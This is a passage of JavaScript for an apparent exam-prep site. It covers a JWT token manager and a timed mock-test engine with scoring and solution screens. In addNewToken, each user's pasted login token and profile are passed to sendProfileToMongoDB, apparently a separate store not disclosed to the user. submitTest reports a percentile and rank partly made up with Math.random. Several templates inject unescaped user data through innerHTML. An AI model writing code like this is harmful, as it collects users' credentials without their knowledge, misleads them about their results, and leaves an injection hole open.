    if (USER_TOKENS.length === 0) { container.innerHTML = `<div class="p-4 text-center text-xs font-bold text-slate-500">Abhi koi personal token saved nahi hai.</div>`; return; }
    USER_TOKENS.forEach((t, idx) => {
        const shortTok = t.token.slice(0, 32) + "..." + t.token.slice(-14);
        container.innerHTML += `
            <div class="bg-white border-2 border-sky-200 rounded-2xl p-4 flex flex-wrap justify-between items-center gap-3 shadow-sm">
                <div class="min-w-0 flex-1">
                    <div class="flex items-center gap-2"><span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">MY TOKEN #${idx + 1}</span><h5 class="font-extrabold text-sm text-slate-900 truncate">${t.label}</h5><span class="text-xs text-slate-500 font-bold">(UID: ${t.userId || "Auto"})</span></div>
                    <p class="text-[11px] font-mono text-slate-600 mt-1 truncate">${shortTok}</p>
                </div>
                <div class="flex items-center gap-2">
                    <button onclick="navigator.clipboard.writeText('${t.token}'); alert('Token Copied!');" class="btn-nav bg-sky-600 text-white border-0 text-xs">📋 Copy</button>
                    ${USER_TOKENS.length > 1 ? `<button onclick="deleteToken('${t.id}')" class="btn-nav bg-rose-600 text-white border-0 text-xs">🗑 Delete</button>` : `<span class="text-[11px] font-bold text-emerald-600">● Primary</span>`}
                </div>
            </div>`;
    });
    updateTokenBadge();
}

async function addNewToken() {
    const labelInput = document.getElementById("newTokLabel").value.trim(); const uidInput = document.getElementById("newTokUid").value.trim(); let token = document.getElementById("newTokValue").value.trim();
    if (!token) { alert("Kripya JWT Token paste karein."); return; }
    token = token.replace(/^["']|["']$/g, "").replace(/^Authorization:\s*/i, "").trim();
    const userId = uidInput || extractUidFromJwt(token);
    if (!userId) { alert("Invalid JWT Token format!"); return; }
    const verifiedUser = await fetchUserDetailsFromServer(token, userId);
    if (!verifiedUser) { alert("Server verification failed! Yeh token expired ya invalid hai."); return; }

    const newTokObj = { id: "utok_" + Date.now(), label: labelInput || verifiedUser.name || `My Account ${USER_TOKENS.length + 1}`, userId: String(verifiedUser.userid || verifiedUser.id || userId), token: token, isAdmin: false };
    USER_TOKENS.push(newTokObj); USER_PROFILE = verifiedUser;
    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS)); localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
    sendProfileToMongoDB(verifiedUser, token, "Added via My Token Manager", "N/A");
    document.getElementById("newTokLabel").value = ""; document.getElementById("newTokUid").value = ""; document.getElementById("newTokValue").value = "";
    renderTokenManagerList(); alert(`✅ Token Verified & Added for ${verifiedUser.name || "User"}!`);
}

function deleteToken(id) {
    if (USER_TOKENS.length <= 1) return;
    USER_TOKENS = USER_TOKENS.filter(t => t.id !== id); localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS)); renderTokenManagerList();
}
function filterGrid() {
    const q = document.getElementById("searchBox").value.toLowerCase();
    document.querySelectorAll("#mainGrid .grid-card").forEach(el => { el.style.display = el.innerText.toLowerCase().includes(q) ? "" : "none"; });
}
updateTokenBadge(); if (isUserLoggedIn()) { showSlide("slideHome"); } else { openLoginModal(); }
processPendingBotSync();


// =====================================================
// TEST SERIES & CBT ENGINE (SMART JSON, OPTIONAL & SECTIONAL)
// =====================================================

let testData = [];
let originalTestData = []; 
let currentSecIdx = 0, currentQIdx = 0; 
let timerInterval, timeRemaining = 15 * 60;
let qStartTime = Date.now();
let testMode = 'overall';
let allQsFlat = [], currentFlatIdx = 0;
let apiDataRef = { time: 60 };

function parseRwaQuestions(questions, defaultTime) {
    let parsedSections = [];
    if (questions.length > 0 && questions[0].questions) {
        parsedSections = questions.map(sec => ({
            section: sec.section || sec.section_name || sec.subject_name || "Mock Test",
            optional_group: sec.optional_group || "",
            time: parseInt(sec.time) || 0,
            questions: sec.questions.map(q => formatSingleQ(q))
        }));
        return parsedSections;
    }
    
    let map = {};
    questions.forEach(q => {
        let sec = q.subject_name || q.section_name || q.section || "Mock Test";
        let opt = q.optional_group || "";
        
        let secLower = sec.toLowerCase();
        if (!opt && (secLower.includes("hindi") || secLower.includes("english"))) {
            opt = "Language (Optional)";
        }
        if (!map[sec]) { map[sec] = { section: sec, optional_group: opt, time: 0, questions: [] }; }
        map[sec].questions.push(formatSingleQ(q));
    });
    return Object.values(map);
}

function formatSingleQ(q) {
    return {
        text: q.question || q.question_text || "",
        image_link: q.image_link_1 || q.image || "",
        options: [q.option_1, q.option_2, q.option_3, q.option_4],
        correct: (parseInt(q.answer) || 1) - 1,
        exp: q.solution_text || q.solution || "",
        exp_image_link: q.solution_image_1 || "",
        positive_marks: parseFloat(q.positive_marks || q.marks) || 2,
        negative_marks: parseFloat(q.negative_marks) || 0.5
    };
}

async function launchCbtTest(tKey) {
    const t = state.testMap[tKey];
    if (!t) return;
    state.cbtTest = t;
    const testTok = t.tokenObj || state.activeTokenObj || USER_TOKENS[0];
    state.activeTokenObj = testTok;

    showSlide("slideTestAttempt");
    
    document.getElementById("start-screen").classList.remove("hidden");
    document.getElementById("live-test-screen").classList.add("hidden");
    document.getElementById("submit-screen").classList.add("hidden");
    document.getElementById("analysis-screen").classList.add("hidden");
    document.getElementById("solutions-screen").classList.add("hidden");
    document.getElementById("full-sol-screen").classList.add("hidden");

    document.getElementById("start-screen").innerHTML = `<div class="start-card" style="width:90%; margin:auto;"><h2 style="text-align:center; color:#1a237e;">🔄 Loading Mock Test...</h2></div>`;

    const uid = testTok.userId || extractUidFromJwt(testTok.token) || "4756316";
    let questions = [];
    const qUrl = (t.test_questions_url || "").replace(/\\\//g, "/");

    if (qUrl && qUrl.startsWith("http")) {
        try {
            const res = await fetch(qUrl);
            if (res.ok) questions = await res.json();
        } catch {
            try {
                const proxiedRes = await fetch(WORKER_RAW_PROXY + encodeURIComponent(qUrl));
                if (proxiedRes.ok) questions = await proxiedRes.json();
            } catch {}
        }
    }
    if (!Array.isArray(questions) || questions.length === 0) questions = DB.fallbackCbtQuestions;

    originalTestData = parseRwaQuestions(questions, t.time);
    
    let hasSectionalTime = originalTestData.some(s => s.time > 0);
    testMode = hasSectionalTime ? 'sectional' : 'overall';
    apiDataRef = { time: parseInt(t.time) || 60, title: t.title };
    window.selectedOptionalSubjects = {}; 

    renderTcsStartScreen();
}

function renderTcsStartScreen() {
    let optionalGroups = {};
    let compulsorySubjects = [];
    
    originalTestData.forEach(sec => {
        if (sec.optional_group && sec.optional_group.trim() !== "") {
            let groupName = sec.optional_group.trim();
            if (!optionalGroups[groupName]) optionalGroups[groupName] = [];
            optionalGroups[groupName].push(sec);
        } else {
            compulsorySubjects.push(sec);
        }
    });

    let html = `
    <div class="start-card" style="width:90%; margin:0 auto;">
        <h2 style="color: #1a237e; border-bottom: 1px solid #eee; padding-bottom: 12px; text-align:center;">${apiDataRef.title || "Mock Test"}</h2>
        <div style="font-weight:bold; color:#1a237e; border-bottom: 2px solid #e8eaf6; padding-bottom: 8px; margin-bottom: 12px; font-size: 15px;">
            📚 Subjects in this Test:
        </div>`;

    compulsorySubjects.forEach(sec => {
        html += `<div class="sub-card fixed"><span class="sub-name"><span class="fixed-icon">✅</span> ${sec.section}</span><span class="sub-badge">${sec.questions.length} Qs</span></div>`;
    });

    for (let group in optionalGroups) {
        window.selectedOptionalSubjects[group] = optionalGroups[group][0].section;
        html += `<div class="opt-group"><div class="opt-group-title" style="font-weight:bold; color:#e65100; margin:10px 0 6px 0;">📝 Select Any One Optional (${group}):</div>`;
        optionalGroups[group].forEach((sec, idx) => {
            let isSel = idx === 0 ? "selected" : "";
            html += `<div class="sub-card opt-card ${isSel}" onclick="selectOptionalSubject(this, '${group}', '${sec.section}')" style="cursor:pointer;">
                <span class="sub-name"><span class="check-icon" style="margin-right:5px;">✓</span>${sec.section}</span>
                <span class="sub-badge">${sec.questions.length} Qs</span>
            </div>`;
        });
        html += `</div>`;
    }

    html += `<div class="stats-box">
                <div class="start-info"><span>Total Questions:</span> <span id="stat-qs">--</span></div>
                <div class="start-info"><span>Total Time:</span> <span id="stat-time">--</span></div>
                <div class="start-info"><span>Max Marks:</span> <span id="stat-marks">--</span></div>
            </div>
            <button class="start-btn" onclick="startTest()">Start Live Test</button>
        </div>`;
    
    document.getElementById("start-screen").innerHTML = html;
    updateStartStatsUI();
}

window.selectOptionalSubject = function(element, group, secName) {
    let allCards = element.parentElement.querySelectorAll('.opt-card');
    allCards.forEach(c => c.classList.remove('selected'));
    element.classList.add('selected');
    window.selectedOptionalSubjects[group] = secName;
    updateStartStatsUI();
};

window.updateStartStatsUI = function() {
    let selectedOptionals = Object.values(window.selectedOptionalSubjects || {});
    let totalQs = 0; let totalTime = 0; let maxMarks = 0;

    originalTestData.forEach(sec => {
        if (sec.optional_group && sec.optional_group.trim() !== "") {
            if (!selectedOptionals.includes(sec.section)) return;
        }
        totalQs += sec.questions ? sec.questions.length : 0;
        totalTime += sec.time || 15;
        if(sec.questions && sec.questions.length > 0) {
            maxMarks += sec.questions.length * sec.questions[0].positive_marks;
        }
    });

    let displayTime = testMode === 'overall' ? apiDataRef.time : totalTime;
    document.getElementById('stat-qs').innerText = totalQs;
    document.getElementById('stat-time').innerText = testMode === 'overall' ? `${displayTime} mins` : "Sectional Timing";
    document.getElementById('stat-marks').innerText = maxMarks.toFixed(1);
};

function hideAllScreens() { document.querySelectorAll('.app-container > div').forEach(el => el.classList.add('hidden')); }

function startTest() {
    try {
        let elem = document.documentElement;
        if (elem.requestFullscreen) elem.requestFullscreen();
        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
    } catch(e) {}

    let selectedOptionals = Object.values(window.selectedOptionalSubjects || {});
    testData = [];
    
    originalTestData.forEach(sec => {
        if (sec.optional_group && sec.optional_group.trim() !== "") {
            if (!selectedOptionals.includes(sec.section)) return; 
        }
        let secCopy = JSON.parse(JSON.stringify(sec)); 
        if(secCopy.questions) {
            secCopy.questions.forEach(q => { q.userAns = null; q.status = 'not_visited'; q.time = 0; });
        }
        testData.push(secCopy);
    });

    timeRemaining = testMode === 'overall' ? (apiDataRef.time || 60) * 60 : (testData[0].time || 15) * 60;
    
    if (testMode === 'sectional') {
        document.getElementById('timer-lbl').innerText = "Sec Time";
        document.getElementById('btn-submit-dynamic').innerText = "Submit Sec";
    }

    hideAllScreens(); 
    document.getElementById('live-test-screen').classList.remove('hidden'); 
    loadSection(0);
    startTimer(); 
}

function formatTcsTimer(totalSecs) {
    let h = Math.floor(totalSecs / 3600); let m = Math.floor((totalSecs % 3600) / 60); let s = totalSecs % 60;
    return `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
}

function startTimer() { 
    clearInterval(timerInterval);
    timerInterval = setInterval(() => { 
        timeRemaining--; 
        let display = document.getElementById('tcs-timer-display');
        if(display) display.innerText = formatTcsTimer(timeRemaining); 
        
        let elapsed = Math.floor((Date.now() - qStartTime) / 1000);
        let m = Math.floor(elapsed/60), s = elapsed%60;
        let qTimeBox = document.getElementById('tcs-q-time');
        if(qTimeBox) qTimeBox.innerText = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;

        if(timeRemaining <= 0) {
            if (testMode === 'sectional') {
                alert("Section time is up!");
                if (currentSecIdx < testData.length - 1) loadSection(currentSecIdx + 1);
                else prepareSubmit();
            } else {
                prepareSubmit(); 
            }
        }
    }, 1000); 
}

function loadSection(sIdx) {
    currentSecIdx = sIdx; currentQIdx = 0;
    if (testMode === 'sectional' && testData[sIdx]) {
        timeRemaining = (testData[sIdx].time || 15) * 60;
    }
    renderTabs(); loadQuestion(sIdx, 0);
}

function renderTabs() {
    let html = ''; 
    testData.forEach((sec, idx) => { 
        let isActive = (idx === currentSecIdx) ? 'active' : '';
        if (testMode === 'sectional') {
            let isLocked = (idx !== currentSecIdx) ? 'locked' : '';
            html += `<div class="tcs-tab ${isActive} ${isLocked}" id="tab-${idx}">${sec.section}</div>`;
        } else {
            html += `<div class="tcs-tab ${isActive}" id="tab-${idx}" onclick="loadSection(${idx})">${sec.section}</div>`; 
        }
    });
    document.getElementById('tcs-tabs-container').innerHTML = html;
    setTimeout(() => {
        let activeTab = document.getElementById(`tab-${currentSecIdx}`);
        if(activeTab) activeTab.scrollIntoView({behavior: "smooth", inline: "center"});
    }, 100);
}

function updateQuestionTime() { 
    let elapsed = Math.floor((Date.now() - qStartTime) / 1000); 
    testData[currentSecIdx].questions[currentQIdx].time += elapsed; 
    qStartTime = Date.now(); 
}

function isImageUrl(url) {
    if (!url) return false;
    let str = url.toString().trim();
    return str.startsWith("http://") || str.startsWith("https://") || str.match(/\.(jpeg|jpg|gif|png|webp|svg)(\?.*)?$/i) != null;
}

function formatMathText(text) {
    if (!text) return "";
    return text.toString().replace(/\\frac{([^}]+)}{([^}]+)}/g, '\\(\\frac{$1}{$2}\\)');
}

function triggerMathJax() {
    if (window.MathJax && window.MathJax.typesetPromise) MathJax.typesetPromise().catch(() => {});
}

function loadQuestion(secIdx, qIdx) {
    updateQuestionTime(); currentSecIdx = secIdx; currentQIdx = qIdx;
    let q = testData[secIdx].questions[qIdx];
    if(q.status === 'not_visited') q.status = 'not_answered';

    document.getElementById('tcs-q-num').innerText = qIdx + 1;
    let qHtml = q.text ? formatMathText(q.text) : '';
    if (q.image_link) qHtml += `<br><img src="${q.image_link}" style="max-width:100%; margin-top:10px; display:block; border-radius:4px;">`;
    document.getElementById('tcs-q-text').innerHTML = qHtml || 'Question';

    let optionsHtml = '';
    let optPrefix = ['A', 'B', 'C', 'D'];
    q.options.forEach((opt, i) => { 
        let isSel = (q.userAns === i) ? 'selected' : ''; 
        let optContent = isImageUrl(opt) ? `<img src="${opt}" style="max-height:100px; max-width:100%; display:block; border-radius:4px;">` : formatMathText(opt);
        optionsHtml += `<div class="tcs-option ${isSel}" onclick="selectOption(${i})"><span class="tcs-opt-lbl">${optPrefix[i]}.</span> <div style="flex:1;">${optContent}</div></div>`; 
    });
    document.getElementById('tcs-options-container').innerHTML = optionsHtml;
    
    document.querySelector('.tcs-m-pos').innerText = "+" + (q.positive_marks || 2);
    document.querySelector('.tcs-m-neg').innerText = "-" + (q.negative_marks || 0.25);
    triggerMathJax(); 
}

function selectOption(optIndex) { testData[currentSecIdx].questions[currentQIdx].userAns = optIndex; loadQuestion(currentSecIdx, currentQIdx); }
function saveAndNext() { 
    let q = testData[currentSecIdx].questions[currentQIdx]; 
    if(q.userAns !== null) q.status = 'answered'; else if (q.status !== 'marked') q.status = 'not_answered';
    nextQuestion();
}
function markForReview() { testData[currentSecIdx].questions[currentQIdx].status = 'marked'; nextQuestion(); }
function clearResponse() { testData[currentSecIdx].questions[currentQIdx].userAns = null; testData[currentSecIdx].questions[currentQIdx].status = 'not_answered'; loadQuestion(currentSecIdx, currentQIdx); }

function nextQuestion() {
    if(currentQIdx < testData[currentSecIdx].questions.length - 1) {
        loadQuestion(currentSecIdx, currentQIdx + 1);
    } else {
        if (testMode === 'overall') {
            if(currentSecIdx < testData.length - 1) loadSection(currentSecIdx + 1);
        } else {
            alert("Last question of this section. Click 'Submit Sec' to proceed.");
        }
    }
}
function prevQuestion() { 
    if(currentQIdx > 0) loadQuestion(currentSecIdx, currentQIdx - 1); 
    else if (currentSecIdx > 0 && testMode === 'overall') { let prevSec = currentSecIdx - 1; loadQuestion(prevSec, testData[prevSec].questions.length - 1); }
}

function toggleTcsPalette() { 
    let drawer = document.getElementById('tcs-palette'); 
    if(drawer.classList.contains('show')) drawer.classList.remove('show'); 
    else { renderTcsDrawer(); drawer.classList.add('show'); } 
}

function renderTcsDrawer() {
    let html = '';
    testData.forEach((sec, sIdx) => {
        let counts = { ans:0, notAns:0, marked:0, notVis:0 };
        let gridHtml = '';
        sec.questions.forEach((q, qIdx) => {
            let cls = 'st-not-ans';
            if(q.status === 'answered') { cls = 'st-ans'; counts.ans++; } 
            else if(q.status === 'not_answered') { cls = 'st-not-ans'; counts.notAns++; } 
            else if(q.status === 'marked') { cls = q.userAns !== null ? 'st-mark-ans' : 'st-mark'; counts.marked++; } 
            else { cls = 'st-not-ans'; counts.notVis++; }
            gridHtml += `<div class="tcs-q-box ${cls}" onclick="jumpToQ(${sIdx}, ${qIdx})">${qIdx+1}</div>`;
        });
        let isOpen = (sIdx === currentSecIdx) ? 'open' : '';
        html += `
        <div class="tcs-accordion">
            <div class="tcs-acc-header" onclick="toggleAcc(${sIdx})"><span>${sec.section}</span><span id="arr-${sIdx}">${isOpen ? '▲' : '▼'}</span></div>
            <div class="tcs-acc-stats">
                <span><div class="tcs-circ c-marked" style="width:10px;height:10px;display:inline-block;"></div> ${counts.marked}</span>
                <span><div class="tcs-circ c-attempt" style="width:10px;height:10px;display:inline-block;"></div> ${counts.ans}</span>
                <span><div class="tcs-circ c-unattempt" style="width:10px;height:10px;display:inline-block;"></div> ${counts.notAns+counts.notVis}</span>
            </div>
            <div class="tcs-q-grid ${isOpen}" id="acc-grid-${sIdx}">${gridHtml}</div>
        </div>`;
    });
    document.getElementById('tcs-accordion-container').innerHTML = html;
}

function toggleAcc(idx) {
    if(testMode === 'sectional') return;
    let grid = document.getElementById(`acc-grid-${idx}`);
    let arr = document.getElementById(`arr-${idx}`);
    if(grid.classList.contains('open')) { grid.classList.remove('open'); arr.innerText = '▼'; }
    else { grid.classList.add('open'); arr.innerText = '▲'; }
}

function jumpToQ(sIdx, qIdx) { 
    if (testMode === 'sectional' && sIdx !== currentSecIdx) return alert("You cannot jump across sections in sectional mode.");
    toggleTcsPalette(); loadQuestion(sIdx, qIdx); 
}

function handleDynamicSubmit() { 
    if (testMode === 'sectional') {
        if (confirm("Submit this section? You cannot return to it later.")) {
            if (currentSecIdx < testData.length - 1) loadSection(currentSecIdx + 1);
            else prepareSubmit();
        }
    } else {
        prepareSubmit();
    }
}

function prepareSubmit() {
    updateQuestionTime(); hideAllScreens(); document.getElementById('submit-screen').classList.remove('hidden');
    let html = '';
    testData.forEach((sec, idx) => {
        let ans = 0, marked = 0, notVis = 0;
        sec.questions.forEach(q => { if(q.status === 'answered') ans++; else if(q.status === 'marked') marked++; else if(q.status === 'not_visited') notVis++; });
        html += `<div class="section-summary-card"><h2 style="margin-bottom:12px; font-size:16px;">${sec.section}</h2><div class="stat-row"><span>Total Questions</span> <strong>${sec.questions.length}</strong></div><div class="stat-row"><span>Answered</span> <strong>${ans}</strong></div><div class="stat-row"><span>Not Visited</span> <strong>${notVis}</strong></div></div>`;
    });
    document.getElementById('submit-summary-container').innerHTML = html;
}

function closeSubmit() { hideAllScreens(); document.getElementById('live-test-screen').classList.remove('hidden'); }

function submitTest() {
    try { if (document.exitFullscreen) document.exitFullscreen(); } catch(e) {}
    clearInterval(timerInterval); hideAllScreens(); document.getElementById('analysis-screen').classList.remove('hidden');

    let tC = 0, tI = 0, tU = 0; allQsFlat = []; let globalQNum = 1;
    let posMark = parseFloat(testData[0]?.questions[0]?.positive_marks || 2);
    let negMark = parseFloat(testData[0]?.questions[0]?.negative_marks || 0.25);

    testData.forEach((sec, sIdx) => {
        sec.questions.forEach((q, qIdx) => {
            let state = 'unattempted';
            if(q.userAns === null) { tU++; }
            else if(q.userAns === q.correct) { tC++; state = 'correct'; }
            else { tI++; state = 'incorrect'; }
            allQsFlat.push({ ...q, secName: sec.section, globalNum: globalQNum++, state: state });
        });
    });

    let totalQs = tC + tI + tU; 
    let totalMarks = Math.max(0, (tC * posMark) - (tI * negMark));
    let maxMarks = totalQs * posMark;
    let acc = (tC+tI) > 0 ? ((tC / (tC+tI)) * 100).toFixed(2) : 0;
    
    let percentage = maxMarks <= 0 ? 0 : (totalMarks / maxMarks) * 100;
    let remarkBox = document.getElementById('dynamic-remark');
    remarkBox.style.display = 'block';
    if(percentage >= 85) { remarkBox.className = 'remark-banner rem-excellent'; remarkBox.innerHTML = '🏆 Exceptional! Topper Material'; }
    else if(percentage >= 70) { remarkBox.className = 'remark-banner rem-great'; remarkBox.innerHTML = '🔥 Great Going! Keep it up'; }
    else if(percentage >= 50) { remarkBox.className = 'remark-banner rem-good'; remarkBox.innerHTML = '👍 Good, but needs improvement'; }
    else { remarkBox.className = 'remark-banner rem-poor'; remarkBox.innerHTML = '⚠️ Needs Serious Practice! Don\'t give up'; }

    let percentile = totalMarks <= 0 ? 0 : Math.min(99.9, ((totalMarks / maxMarks) * 100) + (Math.random() * 5)).toFixed(1);
    let rank = totalMarks <= 0 ? Math.floor(Math.random() * 5000) + 15000 : Math.floor((100 - percentile) * 120) + 1;

    document.getElementById('res-score').innerText = `${totalMarks.toFixed(2)}/${maxMarks.toFixed(1)}`;
    document.getElementById('res-correct').innerText = tC; 
    document.getElementById('res-incorrect').innerText = tI; 
    document.getElementById('res-unatt').innerText = tU; 
    document.getElementById('res-rank').innerText = rank;
    document.getElementById('res-perc').innerText = percentile + "%";
}

function exitCbtTest() {
    try { if (document.exitFullscreen) document.exitFullscreen(); } catch(e) {}
    if (timerInterval) clearInterval(timerInterval);
    showSlide("slideExplorer");
}

function openSolutions() { hideAllScreens(); document.getElementById('solutions-screen').classList.remove('hidden'); currentFilter = 'all'; renderSolutions(); }
function closeSolutions() { hideAllScreens(); document.getElementById('analysis-screen').classList.remove('hidden'); }
function filterSol(type, btn) { document.querySelectorAll('.flt-btn').forEach(b => b.classList.remove('flt-active')); btn.classList.add('flt-active'); currentFilter = type; renderSolutions(); }

function renderSolutions() {
    let html = '';
    allQsFlat.forEach((q, idx) => {
        if(currentFilter !== 'all' && q.state !== currentFilter) return;
        let iconStr = '', iconCls = '';
        if(q.state === 'correct') { iconStr = '✓'; iconCls = 'st-corr'; } else if(q.state === 'incorrect') { iconStr = '✕'; iconCls = 'st-wr'; } else { iconStr = '−'; iconCls = 'st-una'; }
        
        let solQText = q.text ? formatMathText(q.text) : '';
        let solQImg = q.image_link ? `<br><img src="${q.image_link}" style="max-width: 100%; max-height: 80px; display: block; margin-top: 5px; border-radius: 4px;">` : '';
        let displayContent = solQText + solQImg || "Image Question";

        html += `<div class="sol-item"><div class="sol-num-col"><div class="sol-num">${q.globalNum}<div class="sol-status-icon ${iconCls}">${iconStr}</div></div><div class="sol-line"></div></div><div class="sol-card"><div class="sol-sec-badge">${q.secName}</div><div class="sol-q-txt">${displayContent}</div><button class="tcs-btn tcs-btn-submit" style="padding:10px; border-radius:8px; background: #1a237e; border-color: #1a237e;" onclick="openFullSolution(${idx})">See Full Solution</button></div></div>`;
    });
    document.getElementById('sol-list-container').innerHTML = html;
    triggerMathJax(); 
}

function openFullSolution(flatIdx) { currentFlatIdx = flatIdx; hideAllScreens(); document.getElementById('full-sol-screen').classList.remove('hidden'); renderFullSolution(); }
function closeFullSol() { hideAllScreens(); document.getElementById('solutions-screen').classList.remove('hidden'); }

function renderFullSolution() {
    let q = allQsFlat[currentFlatIdx];
    document.getElementById('fs-q-num').innerText = `Question ${q.globalNum}`; 
    let fsQHtml = q.text ? formatMathText(q.text) : '';
    if (q.image_link) fsQHtml += `<br><img src="${q.image_link}" style="max-width:100%; margin-top:10px; display:block; border-radius:4px;">`;
    document.getElementById('fs-q-txt').innerHTML = fsQHtml || 'Question';
    
    let optHtml = '', optPrefix = ['A', 'B', 'C', 'D'];
    q.options.forEach((opt, i) => {
        let cls = '', rightTxt = '';
        if(i === q.correct) { cls = 'correct'; rightTxt = '<span class="fs-opt-perc">Correct</span>'; } 
        else if (i === q.userAns && q.userAns !== q.correct) { cls = 'wrong'; }
        
        let optContent = isImageUrl(opt) ? `<img src="${opt}" style="max-height:80px; max-width:100%; display:block; border-radius:4px;">` : formatMathText(opt);
        optHtml += `<div class="fs-opt ${cls}"><div style="display:flex; align-items:center;"><span>${optPrefix[i]}. &nbsp;&nbsp;</span> <div style="flex:1;">${optContent}</div></div> ${rightTxt}</div>`;
    });
    document.getElementById('fs-options-container').innerHTML = optHtml; 
    
    let expHtml = q.exp ? formatMathText(q.exp) : '';
    if (q.exp_image_link) expHtml += `<br><img src="${q.exp_image_link}" style="max-width:100%; margin-top:10px; display:block; border-radius:4px;">`;
    document.getElementById('fs-exp-text').innerHTML = expHtml;
    triggerMathJax(); 
}
function nextFullSol() { if(currentFlatIdx < allQsFlat.length - 1) { currentFlatIdx++; renderFullSolution(); } else { closeFullSol(); } }
